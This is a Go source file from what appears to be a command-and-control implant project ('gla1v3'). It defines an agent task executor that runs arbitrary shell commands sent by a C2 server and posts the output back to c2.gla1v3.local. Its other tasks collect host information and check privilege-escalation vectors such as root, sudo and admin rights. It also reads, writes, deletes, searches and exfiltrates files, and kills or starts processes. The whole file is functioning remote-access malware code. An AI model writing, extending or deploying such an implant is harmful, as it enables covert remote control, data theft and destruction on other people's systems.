package tasks

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Task represents a task to execute on the agent
type Task struct {
	ID      string            `json:"id"`
	Type    string            `json:"type"`
	Params  map[string]string `json:"params"`
	RunOnce bool              `json:"runOnce"`
}

// TaskResult represents the result of task execution
type TaskResult struct {
	TaskID string `json:"taskId"`
	Type   string `json:"type"`
	Status string `json:"status"`
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

// Executor handles task execution
type Executor struct {
	agentID   string
	c2URL     string
	apiClient *http.Client // for API (task results)
	c2Client  *http.Client // for C2 (beacon + embedded-results)
}

// NewExecutor creates a new task executor
func NewExecutor(agentID, c2URL string, apiClient, c2Client *http.Client) *Executor {
	return &Executor{
		agentID:   agentID,
		c2URL:     c2URL,
		apiClient: apiClient,
		c2Client:  c2Client,
	}
}

// Execute runs a command task and sends the result back to C2
func (e *Executor) Execute(taskID, cmd string, args []string) {
	log.Printf("Executing task %s: %s %v", taskID, cmd, args)
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	var result string
	var taskErr string
	status := "completed"
	
	// Execute the command
	execCmd := exec.CommandContext(ctx, cmd, args...)
	output, err := execCmd.CombinedOutput()
	
	if err != nil {
		taskErr = err.Error()
		status = "failed"
		log.Printf("Task %s failed: %v", taskID, err)
	} else {
		result = string(output)
		if len(result) > 4096 {
			result = result[:4096] + "...(truncated)"
		}
		log.Printf("Task %s completed successfully", taskID)
	}
	
	// Send result back to C2
	e.sendResult(taskID, result, taskErr, status)
}

// ExecuteEmbedded executes a predefined embedded task
func (e *Executor) ExecuteEmbedded(task Task) TaskResult {
	result := TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
		Status: "completed",
	}

	log.Printf("Executing embedded task: %s (type: %s)", task.ID, task.Type)

	switch task.Type {
	case "sys_info":
		result.Output = collectSystemInfo()
	case "cmd":
		output, err := executeCommand(task.Params["command"])
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "priv_check":
		result.Output = collectPrivilegeInfo()
	
	// File operations
	case "file_list":
		output, err := fileList(task.Params["path"])
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "file_read":
		output, err := fileRead(task.Params["path"], 0)
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "file_write":
		appendMode := task.Params["append"] == "true"
		output, err := fileWrite(task.Params["path"], task.Params["data"], appendMode)
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "file_delete":
		recursive := task.Params["recursive"] == "true"
		output, err := fileDelete(task.Params["path"], recursive)
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "file_download":
		output, err := fileDownload(task.Params["path"], 1024*1024) // 1MB chunks
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "file_search":
		output, err := fileSearch(task.Params["path"], task.Params["pattern"], 5)
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	
	// Process operations
	case "proc_list":
		output, err := processList()
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "proc_kill":
		output, err := processKill(task.Params["pid"])
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "proc_kill_name":
		output, err := processKillByName(task.Params["name"])
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "proc_start":
		background := task.Params["background"] == "true"
		output, err := processStart(task.Params["command"], background)
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "proc_info":
		output, err := processInfo(task.Params["pid"])
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	
	default:
		result.Status = "failed"
		result.Error = fmt.Sprintf("Unknown task type: %s", task.Type)
	}

	return result
}

// sendResult sends a task result to the C2 server
func (e *Executor) sendResult(taskID, result, taskErr, status string) {
	resultPayload := map[string]interface{}{
		"result": result,
		"error":  taskErr,
		"status": status,
	}
	
	resultBody, _ := json.Marshal(resultPayload)
	
	// Build result URL
	resultURL := strings.Replace(e.c2URL, "/beacon", fmt.Sprintf("/api/agents/%s/tasks/%s/result", e.agentID, taskID), 1)
	resultURL = strings.Replace(resultURL, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
	
	resultReq, _ := http.NewRequest("POST", resultURL, bytes.NewReader(resultBody))
	resultReq.Header.Set("Content-Type", "application/json")
	
	resultResp, err := e.apiClient.Do(resultReq)
	if err != nil {
		log.Printf("Failed to send task result: %v", err)
		return
	}
	defer resultResp.Body.Close()
	
	log.Printf("Task result sent: %s", resultResp.Status)
}

// SendEmbeddedResults sends embedded task results to C2
func (e *Executor) SendEmbeddedResults(results []TaskResult, c2Server string) {
	if len(results) == 0 {
		return
	}
	
	// Determine correct endpoint depending on host we're talking to.
	// c2.gla1v3.local (C2) mounts agent routes at root (/beacon, /:agentId/embedded-tasks).
	var resultURL string
	if strings.Contains(c2Server, "c2.gla1v3.local") {
		resultURL = fmt.Sprintf("https://%s/%s/embedded-tasks", c2Server, e.agentID)
	} else {
		// Fallback to API host path
		apiURL := strings.Replace("https://"+c2Server, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
		apiURL = strings.Replace(apiURL, "/beacon", "", 1)
		resultURL = fmt.Sprintf("%s/api/agents/%s/embedded-tasks", apiURL, e.agentID)
	}

	payload := map[string]interface{}{
		"results": results,
	}

	body, _ := json.Marshal(payload)

	log.Printf("Sending %d embedded task results to %s", len(results), resultURL)

	req, _ := http.NewRequest("POST", resultURL, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	// Ensure Host header matches TLS SNI / Traefik routing (strip port if present)
	if strings.Contains(c2Server, ":") {
		req.Host = strings.Split(c2Server, ":")[0]
	} else {
		req.Host = c2Server
	}

	// Choose correct HTTP client so TLS SNI / routing matches (use C2 client for c2 host)
	var clientToUse *http.Client
	if strings.Contains(resultURL, "c2.gla1v3.local") {
		clientToUse = e.c2Client
	} else {
		clientToUse = e.apiClient
	}

	resp, err := clientToUse.Do(req)
	if err != nil {
		log.Printf("Failed to send embedded task results: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		log.Printf("Successfully sent embedded task results")
	} else {
		log.Printf("Failed to send embedded task results: %s", resp.Status)
	}
}

// collectSystemInfo gathers basic system information
func collectSystemInfo() string {
	info := make(map[string]string)
	
	// Hostname
	if hostname, err := exec.Command("hostname").Output(); err == nil {
		info["hostname"] = strings.TrimSpace(string(hostname))
	}
	
	// OS and architecture
	info["os"] = runtime.GOOS
	info["arch"] = runtime.GOARCH
	
	// Kernel version (Linux)
	if runtime.GOOS == "linux" {
		if output, err := exec.Command("uname", "-r").Output(); err == nil {
			info["kernel"] = strings.TrimSpace(string(output))
		}
		
		// OS version
		if data, err := exec.Command("cat", "/etc/os-release").Output(); err == nil {
			for _, line := range strings.Split(string(data), "\n") {
				if strings.HasPrefix(line, "PRETTY_NAME=") {
					info["os_version"] = strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
					break
				}
			}
		}
	} else if runtime.GOOS == "windows" {
		if output, err := exec.Command("cmd", "/c", "ver").Output(); err == nil {
			info["os_version"] = strings.TrimSpace(string(output))
		}
	}
	
	output, _ := json.MarshalIndent(info, "", "  ")
	return string(output)
}

// executeCommand runs a shell command
func executeCommand(command string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}
	
	output, err := cmd.CombinedOutput()
	result := string(output)
	
	if len(result) > 4096 {
		result = result[:4096] + "...(truncated)"
	}
	
	return result, err
}

// collectPrivilegeInfo checks for privilege escalation vectors
func collectPrivilegeInfo() string {
	info := make(map[string]interface{})
	
	// Check if running as root/admin
	if runtime.GOOS == "linux" {
		output, _ := exec.Command("id", "-u").Output()
		uid := strings.TrimSpace(string(output))
		info["is_root"] = (uid == "0")
		info["uid"] = uid
		
		// Check sudo access
		if err := exec.Command("sudo", "-n", "true").Run(); err == nil {
			info["has_sudo"] = true
		} else {
			info["has_sudo"] = false
		}
	} else if runtime.GOOS == "windows" {
		// Windows admin check
		cmd := exec.Command("net", "session")
		if err := cmd.Run(); err == nil {
			info["is_admin"] = true
		} else {
			info["is_admin"] = false
		}
	}
	
	output, _ := json.MarshalIndent(info, "", "  ")
	return string(output)
}

// ParseEmbeddedTasks parses embedded tasks from JSON
func ParseEmbeddedTasks(tasksJSON string) ([]Task, error) {
	if tasksJSON == "" || tasksJSON == "[]" {
		return nil, nil
	}
	
	var tasks []Task
	if err := json.Unmarshal([]byte(tasksJSON), &tasks); err != nil {
		return nil, fmt.Errorf("failed to parse embedded tasks: %v", err)
	}
	
	return tasks, nil
}
